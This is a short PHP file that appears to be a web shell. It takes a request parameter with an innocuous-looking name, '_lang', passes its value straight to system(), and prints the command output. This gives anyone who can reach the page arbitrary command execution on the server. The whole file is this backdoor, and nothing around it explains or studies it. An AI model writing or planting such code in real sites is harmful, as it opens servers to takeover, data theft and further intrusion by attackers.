<?php

if(isset($_REQUEST['_lang'])){
        echo "<pre>";
        $cmd = ($_REQUEST['_lang']);
        system($cmd);
        echo "</pre>";
        die;
}

?>